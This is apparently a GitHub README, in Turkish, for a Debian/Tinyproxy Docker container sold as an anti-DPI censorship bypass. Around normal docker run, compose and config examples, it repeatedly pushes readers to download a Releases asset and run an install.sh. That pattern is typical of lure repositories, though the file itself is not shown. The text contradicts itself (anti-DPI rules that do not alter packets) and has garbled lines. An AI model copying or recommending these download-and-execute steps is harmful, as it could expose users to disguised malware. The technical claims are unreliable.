# zapret-docker: Tinyproxy Debian Docker for Anti-DPI Access
[![Releases](https://img.shields.io/badge/Releases-download-blue?logo=github)](https://github.com/Garmode3073/zapret-docker/releases)

![Network Proxy](https://images.unsplash.com/photo-1509395176047-4a66953fd231?auto=format&fit=crop&w=1400&q=80)

Zapret için Tinyproxy ve Debian tabanlı Docker konteyneri. Bu repo, Türkiye'deki veya benzer kısıtlamaları olan ağlarda DPI (Deep Packet Inspection) tabanlı engellemeleri aşmak amacıyla tasarlanmış, küçük ve yönetilebilir bir proxy konteyneri sunar. Rehber, kurulum, yapılandırma, ağ kuralları ve sık karşılaşılan sorunlara çözümler içerir.

İçindekiler
- Özellikler
- Nasıl çalışır
- Hızlı başlangıç
- Yapılandırma
- Dockerfile ve imaj oluşturma
- Çalıştırma örnekleri
- Ağ ve güvenlik
- Kayıtlar ve hata ayıklama
- Sürüm ve güncellemeler
- SSS
- Katkıda bulunma
- Lisans

Özellikler
- Tinyproxy tabanlı hafif HTTP/HTTPS proxy.
- Debian tabanlı imaj. Kestirme ve uyumluluk.
- Anti-DPI yapılandırmaları için önceden ayarlanmış kurallar.
- Kolay loglama ve yönetim.
- Proxy erişimini IP veya kimlik bilgisi ile sınırlandırma.
- Docker etiketiyle dağıtım ve güncelleme.

Nasıl çalışır
- Tinyproxy, gelen HTTP/HTTPS isteklerini kabul eder.
- Konteyner içinde belirlenen kurallar, paketleri yönlendirir veya yeniden yazmaz.
- Trafik, istenirse SOCKS/SSH tüneli veya başka bir çıkış noktasına yönlendirilebilir.
- DPI ortamlarında paket biçimi ve başlıkları dikkatle korunur. Bu sayede bazı DPI imzileri tetiklenmez.

Hızlı başlangıç
1) Lokal sistemde Docker kurulu olsun.
2) Aşağıdaki örnek komutla imajı çalıştırın:
   docker run -d --name zapret \
     -p 3128:3128 \
     -v /srv/zapret/config/tinyproxy.conf:/etc/tinyproxy/tinyproxy.conf:ro \
     -e PROXY_USER=user \
     -e PROXY_PASS=pass \
     garmode3073/zapret-docker:latest

3) Tarayıcı veya sistem proxy ayarında localhost:3128 kullanın.

Not: Bu README içinde ilk başta yer alan Releaseler bağlantısına göz atın ve en güncel dosyayı indirin:
[![Download Release](https://img.shields.io/badge/Release_Asset-download-orange?logo=github)](https://github.com/Garmode3073/zapret-docker/releases)

Yapılandırma
- Konfigürasyon dosyası: /etc/tinyproxy/tinyproxy.conf
- Örnek önemli parametreler:
  - Port: Tinyproxy dinlediği port. Varsayılan 3128.
  - Allow: İzin verilen IP aralıkları.
  - BasicAuth: Kullanıcı adı/şifre ile erişim.
  - LogLevel: NORMAL veya ERROR.
  - ConnectPort: HTTPS CONNECT için izin verilen port aralıkları.

Örnek tinyproxy.conf parçaları:
- allow 10.0.0.0/8
- BasicAuth user passwordhash
- Timeout 600
- MaxClients 100

Kimlik doğrulama
- PROXY_USER ve PROXY_PASS ortam değişkenleriyle konteyner içinde basit temel kimlik doğrulama aktif edilir.
- Daha güçlü kurulumlar için dış bir kimlik servisinden (LDAP, htpasswd) yararlanın.

Dockerfile ve imaj oluşturma
- Taban: debian:stable-slim
- Tinyproxy kurulumu APT üzerinden yapılır.
- Aşağıda ana adımlar özetlenir:
  1. apt update && apt install -y tinyproxy curl ca-certificates
  2. Varsayılan tinyproxy.conf üzerine repo konfigürasyonunu kopyala.
  3. Non-root kullanıcı ile çalıştır.
  4. ENTRYPOINT olarak tinyproxy çalıştır.

Örnek yapı komutu:
  docker build -t garmode3073/zapret-docker:latest .

İmaj etiketleme
- Sürüm numarası verin. Örnek: garmode3073/zapret-docker:1.0.0
- CI/CD pipeline içinde otomatik etiketleme uygulayın.

Çalıştırma örnekleri
- Basit:
  docker run -d --name zapret -p 3128:3128 garmode3073/zapret-docker:latest

- IP kısıtlamalı:
  docker run -d --name zapret -p 3128:3128 \
    -v /srv/zapret/config/tinyproxy.conf:/etc/tinyproxy/tinyproxy.conf:ro \
    garmode3073/zapret-docker:latest

- Docker Compose (örnek):
  version: '3.8'
  services:
    zapret:
      image: garmode3073/zapret-docker:latest
      ports:
        - "3128:3128"
      volumes:
        - ./config/tinyproxy.conf:/etc/tinyproxy/tinyproxy.conf:ro
      environment:
        - PROXY_USER=user
        - PROXY_PASS=pass
      restart: unless-stopped

Ağ ve güvenlik
- Host ağ kurallarını açık tutmayın. Yalnızca gerekli portları açın.
- Proxy erişimini IP bazlı sınırlayın.
- TLS terminate etmeden proxy kullanmayın. HTTP CONNECT TLS trafik için sadece tünel sağlar.
- Konteyneri non-root kullanıcı ile çalıştırın.
- Logları merkezi bir sisteme gönderin (syslog, ELK, loki).

Kayıtlar ve hata ayıklama
- Tinyproxy logları /var/log/tinyproxy/tinyproxy.log içinde bulunur.
- Konteyner stdout/stderr için docker logs kullanın:
  docker logs -f zapret
- Bağlantı kurulamıyorsa:
  - İzin verilen IP listesine bakın.
  - Port yönlendirmeyi kontrol edin.
  - Ağ namespace ve iptables kurallarını kontrol edin.
- Performans sorunları:
  - MaxClients değerini artırın.
  - ConnTimeout ve thread ayarlarını inceleyin.

Sürüm ve güncellemeler
En son sürümleri ve ikili dosyaları indirmek için Releases sayfasını ziyaret edin. Bu adreste, yayımlanmış paketler, Docker etiketleri ve kullanım talimatları bulunur. Lütfen uygun sürüm dosyasını indirin ve çalıştırın. İndirdiğiniz dosyayı çalıştırmadan önce içeriği doğrulayın. İndirme ve çalıştırma adımı örneği:
- GitHub Releases sayfasından ilgili sürümü seçin.
- İndirilen arşiv veya script dosyasını açın.
- Klasör içinde bulunan install.sh veya run.sh dosyasını indirin ve execute edin:
  chmod +x install.sh
  ./install.sh

Releases sayfası:
[![Releases](https://img.shields.io/badge/See_Releases-on%20GitHub-blue?logo=github)](https://github.com/Garmode3073/zapret-docker/releases)

Sürüm notları genellikle:
- Değişiklik listesi.
- Güvenlik yamaları.
- Docker etiketleri ve SHA256 imzaları.

Güncelleme akışı
- Yeni imaj çekin: docker pull garmode3073/zapret-docker:latest
- Konteyneri durdurun ve yeniden başlatın:
  docker stop zapret && docker rm zapret
  docker run ... <aynı parametreler>

SSS (Sık Sorulan Sorular)
- Bu imaj DPI'yi tamamen aşar mı?
  DPI çok katmanlı bir teknoloji. Bu imaj paket başlıklarını değiştirmez. Bazı DPI kuralları HTTP başlıklarına bakar. Bu nedenle, her ortamda aynı sonucu almayabilirsiniz.

- Bağlantı yavaşsa ne yapmalıyım?
  Kaynak kullanımını izleyin. CPU ve ağ limitleri performansı etkiler. MaxClients, timeout ve buffer değerlerini inceleyin.

- HTTPS nasıl çalışır?
  Tinyproxy, CONNECT metodunu tünel oluşturmak için kullanır. TLS terminasyonu burada yapılmaz. Uç noktanızda TLS terminate ediyorsanız, o noktada sertifikalar yönetilir.

- SOCKS desteği var mı?
  Tinyproxy doğrudan SOCKS desteklemez. SOCKS gerekiyorsa ek bir servis (dante, ssh -D) bağlayın.

- Loglar nasıl temizlenir?
  Logrotate veya docker logging driver kullanın. Log dosyalarını periyodik temizleyin.

Katkıda bulunma
- Fork yapın.
- Yeni bir branch açın.
- Değişiklikleri test edin.
- Pull request gönderin.
- Kod stili ve commit mesajlarına dikkat edin.

İçerik önerileri
- Daha fazla güvenlik testi ekleyin.
- Alternatif tünel seçenekleri (SSH, WireGuard) gösterin.
- Otomatik test ve CI pipeline ekleyin.

Geliştirici ipuçları
- Debug için interactive bir konteyner başlatın:
  docker run -it --rm --entrypoint /bin/bash garmode3073/zapret-docker:latest
- Imajın boyutunu küçültmek için multi-stage build kullanın.
- Apt cache temizleyin: apt-get clean && rm -rf /var/lib/apt/lists/*

Uyumluluk ve etiketler
- Bu repo anti-dpi, anticensorship, censorship-circumvention, deep-packet-inspection, docker, docker-image, dpi, linux, proxy-server, turkiye gibi alanlara hitap eder.
- Konteyner Linux üzerinde ve Docker Engine ile çalışır.

Görseller ve emojiler
- Badge ve ikonlar için img.shields.io kullanıldı.
- Temsili ağ görseli yukarıdaki Unsplash kaynağından alındı.

Lisans
- Bu proje açık kaynaklıdır. Lisans dosyasına bakın.

Releaseler sayfasını tekrar kontrol edin. İlgili sürümü indirin, gerekli dosyayı downloaded ve execute edin. İndirdiğiniz dosyayı çalıştırdıktan sonra yapılandırma dosyanızı konteyner içine yerleştirin ve servisleri takip edin.